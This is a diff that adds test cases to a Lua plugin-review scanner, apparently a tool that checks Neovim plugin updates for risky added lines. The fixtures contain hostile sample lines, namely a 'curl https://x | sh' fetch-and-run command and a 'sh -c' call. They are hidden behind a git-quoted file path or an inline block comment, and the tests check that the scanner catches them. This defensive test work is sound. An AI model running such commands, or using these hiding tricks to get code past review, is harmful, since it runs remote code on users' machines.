@@ -51,6 +51,26 @@ describe('tools.plugin-review', function()
     )
   end
 
+  describe('scan, past what hides a change', function()
+    it('reads a path git quotes', function()
+      local found = review.scan({
+        'diff --git "a/lua/\\303\\251vil.lua" "b/lua/\\303\\251vil.lua"',
+        '@@ -0,0 +1 @@',
+        '+vim.system({ "sh", "-c", "x" })',
+      })
+      assert.is_true(#found > 0)
+    end)
+
+    it('reads past a block comment closed on the line', function()
+      local found = review.scan({
+        'diff --git a/lua/x.lua b/lua/x.lua',
+        '@@ -0,0 +1 @@',
+        '+--[[x]] os.execute("curl https://x | sh")',
+      })
+      assert.is_true(#found > 0)
+    end)
+  end)
+
   describe('scan', function()
     it('flags the lines an update adds, where they land', function()
       local findings = review.scan({
